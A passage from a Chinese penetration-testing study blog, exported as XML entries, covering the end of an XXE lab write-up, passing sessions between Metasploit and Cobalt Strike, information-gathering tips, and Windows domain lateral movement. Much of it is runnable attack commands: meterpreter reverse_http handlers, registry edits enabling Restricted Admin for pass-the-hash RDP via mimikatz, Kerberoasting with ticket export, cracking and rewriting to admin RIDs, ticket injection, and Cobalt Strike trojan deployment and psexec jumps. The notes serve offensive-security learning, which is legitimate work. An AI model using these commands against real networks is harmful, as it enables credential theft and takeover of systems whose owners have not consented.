<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp11.png" alt="vulnhub-xxe lab1-wp11"></p>
<p>网上查找base32解密后，得到一串base64加密，再解密后得到flag所在目录<code>/etc/flag.php</code></p>
<p>再利用xxe漏洞去读，并解密</p>
<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp12.png" alt="vulnhub-xxe lab1-wp12"></p>
<p>发现一串认不到的代码，从<code>$</code>符判断应该是php代码，我们找个php在线运行，把代码扔进去跑就行了，得到flag值</p>
<p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/vulnhub-xxe_lab1-wp13.png" alt="vulnhub-xxe lab1-wp13"></p>
<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>下载：<a href="https://github.com/enjoiz/XXEinjector">https://github.com/enjoiz/XXEinjector</a></p>
<p>文章：<a href="https://www.cnblogs.com/bmjoker/p/9614990.html">https://www.cnblogs.com/bmjoker/p/9614990.html</a></p>
<h2 id="修复与防御"><a href="#修复与防御" class="headerlink" title="修复与防御"></a>修复与防御</h2><p><img src="/2021/09/06/Web%E6%BC%8F%E6%B4%9E-9-XXE-XML/XXE%E4%BF%AE%E5%A4%8D%E4%B8%8E%E9%98%B2%E5%BE%A1.png" alt="XXE修复与防御"></p>
]]></content>
      <categories>
        <category>小迪安全-Web渗透测试笔记</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>XXE</tag>
        <tag>XML</tag>
      </tags>
  </entry>
  <entry>
    <title>MSF和CS联动</title>
    <url>/2022/03/30/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-MSF%E5%92%8CCS%E8%81%94%E5%8A%A8/</url>
    <content><![CDATA[<h2 id="CS委派给MSF"><a href="#CS委派给MSF" class="headerlink" title="CS委派给MSF"></a>CS委派给MSF</h2><p>创建Foreign监听器-&gt;MSF监听模块设置对应地址端口-&gt;CS执行Spawn选择监听器</p>
<p>首先要创建一个会话，然后将权限反弹出去</p>
<p>1.创建Foreign监听器</p>
<p>“Listeners”“Add”，“Name”填“msf”（可随便填），“Payload”选“Foreign HTTP”，“HTTP Host(Stager)”填msf的IP地址，“HTTP Port(Stager)”自己设定</p>
<p>这个监听器与木马绑定的监听器非同一个监听器</p>
<p><img src="/2022/03/30/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-MSF%E5%92%8CCS%E8%81%94%E5%8A%A8/image-20220330202413109.png" alt="image-20220330202413109"></p>
<p>2.MSF监听模块设置对应地址端口</p>
<p>选择监听模块</p>
<pre><code>use exploit/multi/handler
</code></pre>
<p>设置payload，注意与CS保持一致</p>
<pre><code>set payload windows/meterpreter/reverse_http
</code></pre>
<p>设置地址端口，其中地址可以不设或为0.0.0.0，意为任意地址，或者设为msf的IP地址（与CS保持一致）；端口一定要保持一致</p>
<pre><code>set lhost 0.0.0.0

set lport 1234
</code></pre>
<p>检查设置</p>
<pre><code>show options
</code></pre>
<p>执行</p>
<pre><code>exploit
</code></pre>
<p>3.CS执行Spawn选择监听器</p>
<p>选择需要反弹shell的电脑，右键“Spawn”，选择刚才生成的监听器</p>
<p><img src="/2022/03/30/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-MSF%E5%92%8CCS%E8%81%94%E5%8A%A8/image-20220330203152350.png" alt="image-20220330203152350"></p>
<p>稍等可在MSF上看见反弹结果，如果没有请检查网络</p>
<p><img src="/2022/03/30/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-MSF%E5%92%8CCS%E8%81%94%E5%8A%A8/image-20220330203211330.png" alt="image-20220330203211330"></p>
<h2 id="MSF委派给CS"><a href="#MSF委派给CS" class="headerlink" title="MSF委派给CS"></a>MSF委派给CS</h2><p>CS创建监听器-&gt;MSF载入新模块注入设置对应地址端口-&gt;执行CS等待上线</p>
<p>1.CS创建监听器</p>
<p>创建一个普通的监听器</p>
<p><img src="/2022/03/30/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-MSF%E5%92%8CCS%E8%81%94%E5%8A%A8/image-20220330204429548.png" alt="image-20220330204429548"></p>
<p>2.MSF载入新模块注入设置对应地址端口</p>
<p>首先查看session值</p>
<pre><code>background

sessions
</code></pre>
<p><img src="/2022/03/30/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-MSF%E5%92%8CCS%E8%81%94%E5%8A%A8/image-20220330203245414.png" alt="image-20220330203245414"></p>
<p>载入注入模块并设置，注意跟CS的监听器保持一致</p>
<pre><code>use exploit/windows/local/payload_inject

set payload windows/meterpreter/reverse_http

set lport [CS监听端口号]

set lhost [CS的IP]

set session [session的id]
</code></pre>
<p>执行</p>
<pre><code>exploit 
</code></pre>
<p>cs接收到</p>
<p><img src="/2022/03/30/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-MSF%E5%92%8CCS%E8%81%94%E5%8A%A8/image-20220330204338660.png" alt="image-20220330204338660"></p>
]]></content>
      <categories>
        <category>内网安全</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>内网安全</tag>
      </tags>
  </entry>
  <entry>
    <title>信息收集</title>
    <url>/2021/08/19/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<p><img src="/2021/08/19/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF.png" alt="信息收集思路"></p>
<span id="more"></span>

<h2 id="CDN-多网"><a href="#CDN-多网" class="headerlink" title="CDN(多网)"></a>CDN(多网)</h2><p>CDN(内容分发网络)通过遍布全国的缓存边缘节点、内部专用线路以及完善的网络路由调度机制为用户自动选择最佳网络访问路径，将源站的内容分发到最接近用户的网络边缘节点，解决用户访问速度慢的问题，提供全方位的更快、更稳定、更便捷的网络访问体验。</p>
<h2 id="WAF-Web-Application-Firewall"><a href="#WAF-Web-Application-Firewall" class="headerlink" title="WAF(Web Application Firewall)"></a>WAF(Web Application Firewall)</h2><p>网站应用级入侵防御系统，web应用防火墙是通过一些列针对HTTP/HTTPS的安全册罗来专门为Web应用提供保护的一款产品</p>
<h2 id="CMS-Content-Management-System"><a href="#CMS-Content-Management-System" class="headerlink" title="CMS(Content Management System)"></a>CMS(Content Management System)</h2><p>意为”内容管理系统”。 </p>
<p>内容管理系统（content management system，CMS）是一种位于WEB 前端（Web 服务器）和后端办公系统或流程（内容创作、编辑）之间的软件系统。内容的创作人员、编辑人员、发布人员使用内容管理系统来提交、修改、审批、发布内容。这里指的“内容”可能包括文件、表格、图片、数据库中的数据甚至视频等一切你想要发布到Internet、Intranet以及Extranet网站的信息。</p>
<p>内容管理还可选地提供内容抓取工具，将第三方信息来源，比如将文本文件、HTML网页、Web服务、关系数据库等的内容自动抓取，并经分析处理后放到自身的内容库中。</p>
<p>随着个性化的发展，内容管理还辅助WEB前端将内容以个性化的方式提供给内容使用者，即提供个性化的门户框架，以基于WEB技术将内容更好地推送到用户的浏览器端。</p>
<h2 id="站点搭建"><a href="#站点搭建" class="headerlink" title="站点搭建"></a>站点搭建</h2><h3 id="目录站点"><a href="#目录站点" class="headerlink" title="目录站点"></a>目录站点</h3><p>/bbs/    论坛</p>
<h3 id="端口站点"><a href="#端口站点" class="headerlink" title="端口站点"></a>端口站点</h3><p>:8080</p>
<p>通过开放的端口，分析站点开启了哪些服务</p>
<h3 id="子域名站点"><a href="#子域名站点" class="headerlink" title="子域名站点"></a>子域名站点</h3><p>同一ip：</p>
<p><strong>bbs</strong>.goodlift.net</p>
<p><strong>www</strong>.goodlift.net</p>
<p>不同ip：</p>
<p><a href="http://www.etiantian.com/">www.etiantian.com</a></p>
<p>web.etiantian.com</p>
<h3 id="类似域名站点"><a href="#类似域名站点" class="headerlink" title="类似域名站点"></a>类似域名站点</h3><h3 id="旁注，C段站点"><a href="#旁注，C段站点" class="headerlink" title="旁注，C段站点"></a>旁注，C段站点</h3><h4 id="旁注：同服务器不同站点"><a href="#旁注：同服务器不同站点" class="headerlink" title="旁注：同服务器不同站点"></a>旁注：同服务器不同站点</h4><p>前提条件：该服务器有多个站点</p>
<p>例如：192.168.1.100</p>
<p>​            <a href="http://www.a.com/">www.a.com</a></p>
<p>​            <a href="http://www.b.com/">www.b.com</a></p>
<p>可以通过找到b的漏洞来攻击a站点</p>
<h4 id="C段：同网段不同服务器不同站点（困难）"><a href="#C段：同网段不同服务器不同站点（困难）" class="headerlink" title="C段：同网段不同服务器不同站点（困难）"></a>C段：同网段不同服务器不同站点（困难）</h4><p>前提条件：独立站点服务器，该服务器只有一个站点利用</p>
<p>例如：192.168.1.100</p>
<p>​            <a href="http://www.a.com/">www.a.com</a></p>
<p>​            </p>
<p>例如：192.168.1.101</p>
<p>​            <a href="http://www.b.com/">www.b.com</a></p>
<p>​            </p>
<h3 id="搭建软件特征站点"><a href="#搭建软件特征站点" class="headerlink" title="搭建软件特征站点"></a>搭建软件特征站点</h3><p>phpstudy、宝塔等</p>
<p>shodan（一款黑暗搜索引擎）</p>
<h2 id="APP"><a href="#APP" class="headerlink" title="APP"></a>APP</h2><p><a href="https://pan.baidu.com/s/13_i1ExwEaA59GfMt1Rp0Hg?_at_=1626861335971">漏了个大洞.zip_免费高速下载|百度网盘-分享无限制 (baidu.com)</a>提取码：0b7b</p>
<p><a href="http://www.xyaz.cn/">【逍遥安卓模拟器】安卓模拟器电脑版_安卓模拟器哪个好用_逍遥安卓模拟器下载官网 (xyaz.cn)</a></p>
<h2 id="信息搜集思路"><a href="#信息搜集思路" class="headerlink" title="信息搜集思路"></a>信息搜集思路</h2><p>找到目标域名，用百度、Google搜索suit:+域名，得到</p>
<h2 id="资产监控"><a href="#资产监控" class="headerlink" title="资产监控"></a>资产监控</h2><p>layer子域名挖掘机 4.2版本</p>
<p>如果存在CDN，用外网去ping可得到真实ip地址，工具<a href="https://tools.ipip.net/cdn.php">全球 CDN 服务商查询_专业的 IP 地址库_IPIP.NET</a></p>
<p>查证书的<a href="https://crt.sh(也涉及一些子域名)/">https://crt.sh（也涉及一些子域名）</a></p>
<p>查询DNS记录<a href="https://dnsdb.io/zh-cn/">DNSDB</a></p>
<p><a href="https://sct.ftqq.com/">Server酱·Turbo版 (ftqq.com)</a></p>
]]></content>
      <categories>
        <category>小迪安全-Web渗透测试笔记</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>域横向CobaltStrike&amp;SPN&amp;RDP</title>
    <url>/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91CobaltStrike&amp;SPN&amp;RDP/</url>
    <content><![CDATA[<h2 id="域横向移动RDP传递-Mimikatz"><a href="#域横向移动RDP传递-Mimikatz" class="headerlink" title="域横向移动RDP传递-Mimikatz"></a>域横向移动RDP传递-Mimikatz</h2><p>获取到的明文密码或HASH密文也可以通过RDP协议（远程桌面）进行连接操作。</p>
<p>判断对方远程桌面服务是否开启（默认：3389），端口扫描判断</p>
<h3 id="RDP明文密码链接"><a href="#RDP明文密码链接" class="headerlink" title="RDP明文密码链接"></a>RDP明文密码链接</h3><p>Windows：win+R 输入mstsc打开远程桌面连接输入账号密码</p>
<p>Windows命令行：mstsc.exe /console /v:IP /admin</p>
<p>Linux：（需要安装rdesktop）rdesktop IP</p>
<h3 id="RDP密文HASH链接"><a href="#RDP密文HASH链接" class="headerlink" title="RDP密文HASH链接"></a>RDP密文HASH链接</h3><p>windows Server需要开启Restricted Admin mode，在Windows 8.1和Windows Server 2012 R2中默认开启，同时如果Win 7和Windows Server 2008 R2安装了2871997、2973351补丁也支持，开启命令：（<strong>只有管理员组(administrators)的用户hash才能用此方式登陆。</strong>）</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 查看是否已开启 DisableRestrictedAdmin REG_DWORD <span class="number">0</span>x0 存在就是开启</span><br><span class="line">REG query &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; | <span class="built_in">findstr</span> &quot;DisableRestrictedAdmin&quot;</span><br><span class="line"></span><br><span class="line"># 开启Restricted Admin <span class="built_in">mode</span>：</span><br><span class="line">REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v DisableRestrictedAdmin /t REG_DWORD /d <span class="number">00000000</span> /f</span><br><span class="line"></span><br><span class="line"># 删除DisableRestrictedAdmin</span><br><span class="line">reg delete &quot;HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa&quot; /v DisableRestrictedAdmin /f</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91CobaltStrike&SPN&RDP/wps1.jpg" alt="img"></p>
<p>通过mimikatz连接(如果在域内，参数/domain换成域名)</p>
<p>mimikatz.exe</p>
<p>privilege::debug</p>
<p>sekurlsa::pth /user:administrator /domain:god /ntlm:抓取的hash “<strong>/run:mstsc.exe /restrictedadmin</strong>“</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91CobaltStrike&SPN&RDP/wps2.png" alt="img"></p>
<h2 id="域横向移动SPN服务-探针，请求，破解，重写"><a href="#域横向移动SPN服务-探针，请求，破解，重写" class="headerlink" title="域横向移动SPN服务-探针，请求，破解，重写"></a>域横向移动SPN服务-探针，请求，破解，重写</h2><p>参考：<a href="https://www.cnblogs.com/backlion/p/8082623.html">kerberos中的spn详解</a></p>
<h3 id="SPN扫描"><a href="#SPN扫描" class="headerlink" title="SPN扫描"></a>SPN扫描</h3><p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91CobaltStrike&SPN&RDP/image-20220312133538597.png" alt="image-20220312133538597"></p>
<p>当计算机加入域时，主SPN会自动添加到域的计算机账号的ServicePrincipalName属性中。在安装新的服务后，SPN也会被记录在计算机账号的相应属性中。</p>
<p>SPN扫描也称为“扫描Kerberos服务实例名称”。在活动目录中发现服务的最佳方法就是SPN扫描。SPN扫描通过请求特定SPN类型的服务主体名称来查找服务。<strong>与网络端口扫描相比，SPN扫描的主要特点是不需要通过连接网络中的每个IP地址来检查服务端口</strong>（不会因为触发内网中的IPS、IDS等设备的规则而产生大量的警告日志）。因为SPN查询是Kerberos票据行为的一部分，所以检测难度很大。</p>
<p>由于SPN扫描是基于LDAP协议向域控制器进行查询的，所以，攻击者只需要获得一个<strong>普通</strong>的<strong>域用户</strong>权限，就可以进行SPN扫描。</p>
<p>在域环境中，发现服务的<strong>最好办法就是通过“SPN扫描”通过请求特定SPN类型服务主体名称来查找服务</strong>。</p>
<h3 id="探针"><a href="#探针" class="headerlink" title="探针"></a>探针</h3><p>探测域内服务</p>
<pre><code>setspn -q */*
</code></pre>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91CobaltStrike&SPN&RDP/image-20220312134743094.png" alt="image-20220312134743094"></p>
<p>寻找特定服务</p>
<pre><code>setspn -q */* | findstr &quot;服务名&quot;
</code></pre>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91CobaltStrike&SPN&RDP/image-20220312134819048.png" alt="image-20220312134819048"></p>
<h3 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h3><p>请求会生成新的票据</p>
<p>请求对应服务</p>
<pre><code>Add-Type -AssemblyName System.IdentityModel

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;服务名&quot;
</code></pre>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91CobaltStrike&SPN&RDP/image-20220312140548599.png" alt="image-20220312140548599"></p>
<p>使用mimikatz请求</p>
<pre><code>mimikatz.exe &quot;kerberos::ask /target:服务名&quot;
</code></pre>
<h3 id="导出"><a href="#导出" class="headerlink" title="导出"></a>导出</h3><p>使用mimikatz导出票据，找到新生成的要攻击破解的票据</p>
<p>导出凭据</p>
<pre><code>mimikatz.exe &quot;kerberos::list /export&quot;
</code></pre>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91CobaltStrike&SPN&RDP/image-20220312140729607.png" alt="image-20220312140729607"></p>
<p>会导出到mimikatz所在的目录</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91CobaltStrike&SPN&RDP/image-20220312140756137.png" alt="image-20220312140756137"></p>
<h3 id="破解（需要借助字典）"><a href="#破解（需要借助字典）" class="headerlink" title="破解（需要借助字典）"></a>破解（需要借助字典）</h3><p>将上面获得的凭据拷贝到本地，使用tgsrepcrack.py脚本加爆破字典来破解</p>
<p>将凭据放在脚本文件目录中后</p>
<pre><code>python3 .\tgsrepcrack.py .\pass.txt .\凭据.kirbi

python3 .\tgsrepcrack.py .\password.txt .\1-40a00000-jerry@MSSQLSvcSrv-DB-0day.0day.org1433-0DAY.ORG.kirbi
</code></pre>
<p>破解成功会把被攻击的服务账户的明文密码显示出来，再想办法利用密码</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91CobaltStrike&SPN&RDP/image-20220312142652081.png" alt="image-20220312142652081"></p>
<h3 id="重写"><a href="#重写" class="headerlink" title="重写"></a>重写</h3><p>使用kerberoast.py和密码重写凭据</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python kerberoast.py <span class="literal">-p</span> 得到的密码 <span class="literal">-r</span> 已有的凭据.kirbi <span class="literal">-w</span> 新凭据的名字.kirbi <span class="literal">-u</span> <span class="number">500</span></span><br><span class="line"></span><br><span class="line">python kerberoast.py <span class="literal">-p</span> Password123 <span class="literal">-r</span> xxxx.kirbi <span class="literal">-w</span> PENTESTLAB.kirbi <span class="literal">-u</span> <span class="number">500</span></span><br><span class="line"></span><br><span class="line">python kerberoast.py <span class="literal">-p</span> 得到的密码 <span class="literal">-r</span> 已有的凭据.kirbi <span class="literal">-w</span> 新凭据的名字.kirbi <span class="literal">-g</span> <span class="number">512</span></span><br><span class="line"></span><br><span class="line">python kerberoast.py <span class="literal">-p</span> Password123 <span class="literal">-r</span> xxxx.kirbi <span class="literal">-w</span> PENTESTLAB.kirbi <span class="literal">-g</span> <span class="number">512</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -u 500 指管理员</span></span><br><span class="line"><span class="comment"># -g 512 指管理员组</span></span><br></pre></td></tr></table></figure>

<p>将生成的票据注入内存</p>
<pre><code>mimikatz.exe kerberos::ptt 票据文件.kirbi
</code></pre>
<p>用重写的凭据来链接，不一定成功，且一般只能得到普通用户权限</p>
<h2 id="域横向移动测试流程-CobaltStrike初体验"><a href="#域横向移动测试流程-CobaltStrike初体验" class="headerlink" title="域横向移动测试流程-CobaltStrike初体验"></a>域横向移动测试流程-CobaltStrike初体验</h2><h3 id="大概流程"><a href="#大概流程" class="headerlink" title="大概流程"></a>大概流程</h3><p>启动-配置-监听-执行-线上-提权-信息收集（网络，凭证，定位）-渗透</p>
<h3 id="cs初体验"><a href="#cs初体验" class="headerlink" title="cs初体验"></a>cs初体验</h3><h4 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h4><p>服务端：</p>
<p>需要Java环境</p>
<p>访问CobaltStrike目录，运行teamserver</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">./teamserver 服务器<span class="built_in">ip</span> 登录<span class="built_in">cs</span>密码(自定义)</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91CobaltStrike&SPN&RDP/image-20220312150437206.png" alt="image-20220312150437206"></p>
<p>本地操作端：</p>
<p>同样需要Java环境</p>
<p>访问CobaltStrike目录，运行start.bat文件</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91CobaltStrike&SPN&RDP/image-20220312150557415.png" alt="image-20220312150557415"></p>
<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><h5 id="配置监听器"><a href="#配置监听器" class="headerlink" title="配置监听器"></a>配置监听器</h5><p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91CobaltStrike&SPN&RDP/image-20220312151923536.png" alt="image-20220312151923536"></p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91CobaltStrike&SPN&RDP/image-20220312152044974.png" alt="image-20220312152044974"></p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91CobaltStrike&SPN&RDP/image-20220312152253729.png" alt="image-20220312152253729"></p>
<h5 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h5><p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91CobaltStrike&SPN&RDP/image-20220312152423217.png" alt="image-20220312152423217"></p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91CobaltStrike&SPN&RDP/image-20220312152619945.png" alt="image-20220312152619945"></p>
<h4 id="简单上线"><a href="#简单上线" class="headerlink" title="简单上线"></a>简单上线</h4><p>将上面生成的木马上传至目标服务器进行运行即可上线cs</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91CobaltStrike&SPN&RDP/image-20220312153050838.png" alt="image-20220312153050838"></p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91CobaltStrike&SPN&RDP/image-20220312153158823.png" alt="image-20220312153158823"></p>
<h3 id="提权及插件加载"><a href="#提权及插件加载" class="headerlink" title="提权及插件加载"></a>提权及插件加载</h3><h4 id="右键菜单"><a href="#右键菜单" class="headerlink" title="右键菜单"></a>右键菜单</h4><p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91CobaltStrike&SPN&RDP/image-20220312160736432.png" alt="image-20220312160736432"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Access</span></span><br><span class="line">Dump Hashes <span class="comment">#获取hash</span></span><br><span class="line">Elevate <span class="comment">#提权</span></span><br><span class="line">Golden Ticket <span class="comment">#生成黄金票据注入当前会话</span></span><br><span class="line">Make token <span class="comment">#凭证转换</span></span><br><span class="line">Run Mimikatz <span class="comment">#运行 Mimikatz </span></span><br><span class="line">Spawn As <span class="comment">#用其他用户生成Cobalt Strike侦听器</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Explore</span></span><br><span class="line">Browser Pivot <span class="comment">#劫持目标浏览器进程</span></span><br><span class="line">Desktop(VNC) <span class="comment">#桌面交互</span></span><br><span class="line">File Browser <span class="comment">#文件浏览器</span></span><br><span class="line">Net View <span class="comment">#命令Net View</span></span><br><span class="line">Port Scan <span class="comment">#端口扫描</span></span><br><span class="line">Process List <span class="comment">#进程列表</span></span><br><span class="line">Screenshot <span class="comment">#截图</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Pivoting</span></span><br><span class="line">SOCKS Server <span class="comment">#代理服务</span></span><br><span class="line">Listener <span class="comment">#反向端口转发</span></span><br><span class="line">Deploy VPN <span class="comment">#部署VPN</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Spawn</span></span><br><span class="line">外部监听器(如指派给MSF，获取meterpreter权限)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Session</span></span><br><span class="line">Note <span class="comment">#备注</span></span><br><span class="line">Remove <span class="comment">#删除</span></span><br><span class="line">Sleep <span class="comment">#指定被控端休眠时间，默认60秒一次回传，让被控端每10秒来下载一次任务。实际中频率不宜过快,容易被发现。</span></span><br><span class="line">Exit <span class="comment">#退出</span></span><br></pre></td></tr></table></figure>

<h4 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h4><p>选择Cobalt Strike下的Script Manager，选择Load载入所需插件的.cna文件</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91CobaltStrike&SPN&RDP/image-20220312161425511.png" alt="image-20220312161425511"></p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91CobaltStrike&SPN&RDP/image-20220312162135050.png" alt="image-20220312162135050"></p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91CobaltStrike&SPN&RDP/image-20220312162158503.png" alt="image-20220312162158503"></p>
<h4 id="提权速度过慢"><a href="#提权速度过慢" class="headerlink" title="提权速度过慢"></a>提权速度过慢</h4><p>选择Session下的Sleep，设置为1或者0</p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.jianshu.com/p/8d823adbc6b5">CobaltStrike基本功能与使用</a></p>
<p><a href="https://www.likecs.com/show-937815.html">Cobaltstrike常用功能</a></p>
<h3 id="信息收集命令"><a href="#信息收集命令" class="headerlink" title="信息收集命令"></a>信息收集命令</h3><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">在视图界面，选中SYSTEM权限的机器右键。“Interact”，打开命令行终端</span><br><span class="line"></span><br><span class="line">输入“<span class="keyword">help</span>”，查看命令</span><br><span class="line"></span><br><span class="line">输入“getuid”，获取权限情况</span><br><span class="line"></span><br><span class="line">输入“<span class="keyword">net</span> <span class="keyword">view</span>”，探测当前的网络环境</span><br><span class="line"></span><br><span class="line">选择“<span class="keyword">View</span>”下的“Targets”，会展示所有已探测的信息</span><br><span class="line"></span><br><span class="line">输入“<span class="keyword">net</span> computers”，探测所有的机器的名字与IP</span><br><span class="line"></span><br><span class="line">输入“<span class="keyword">net</span> dclist”，获取当前域控的信息</span><br><span class="line"></span><br><span class="line">输入“<span class="keyword">net</span> user”，获取当前用户信息</span><br><span class="line"></span><br><span class="line">输入“<span class="keyword">shell</span> <span class="keyword">net</span> user /domain”，加“<span class="keyword">shell</span>”调用cmd执行命令，得到域内所有用户的名字</span><br><span class="line"></span><br><span class="line">选择“Access”下的“<span class="keyword">Run</span> Mimikatz”或者输入“mimikatz”来运行mimikatz</span><br><span class="line"></span><br><span class="line">选择“<span class="keyword">View</span>”下的“Credentials”，会展示mimikatz收集的密码信息</span><br></pre></td></tr></table></figure>

<p>“Targets”界面，选中一台机器，右键“Jump”，选择合适的攻击方法进攻。这里以“psexec”为例</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91CobaltStrike&SPN&RDP/image-20220312163929461.png" alt="image-20220312163929461"></p>
<p>可以选择收集到的密码来攻击，也可以手动填写，<strong>选择合适的监听器和负责攻击的会话</strong>，点击“Launch”</p>
<p><img src="/2022/03/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91CobaltStrike&SPN&RDP/image-20220312164322284.png" alt="image-20220312164322284"></p>
<h2 id="资源（整理来自B站）"><a href="#资源（整理来自B站）" class="headerlink" title="资源（整理来自B站）"></a>资源（<a href="https://www.bilibili.com/read/cv14802167">整理来自B站</a>）</h2><p>taowu-cobalt-strike（插件-小迪精选）：<a href="https://github.com/pandasec888/taowu-cobalt-strike">https://github.com/pandasec888/taowu-cobalt-strike</a></p>
<p>Cobalt Strike 4.0手册：<a href="https://pan.baidu.com/s/15DCt2Rzg5cZjXnEuUTgQ9Q">https://pan.baidu.com/s/15DCt2Rzg5cZjXnEuUTgQ9Q</a> 提取码：dtm2</p>
<p>红队实战演练环境：<a href="https://pan.baidu.com/s/14eVDglqba1aRXi9BGcBbug">https://pan.baidu.com/s/14eVDglqba1aRXi9BGcBbug</a> 提取码：taqu</p>
<p>Erebus（插件-小迪使用）：<a href="https://github.com/DeEpinGh0st/Erebus">https://github.com/DeEpinGh0st/Erebus</a></p>
<p>（Cobalt Strike插件）：<a href="https://github.com/rsmudge/Elevatekit">https://github.com/rsmudge/Elevatekit</a></p>
<p>（Cobalt Strike插件）：<a href="https://github.com/harleyQu1nn/AggressorScripts">https://github.com/harleyQu1nn/AggressorScripts</a></p>
<p>（Cobalt Strike插件）：<a href="https://github.com/bluscreenofjeff/AggressorScripts">https://github.com/bluscreenofjeff/AggressorScripts</a></p>
<p>（Cobalt Strike插件）：<a href="https://github.com/michalkoczwara/aggressor_scripts_collection">https://github.com/michalkoczwara/aggressor_scripts_collection</a></p>
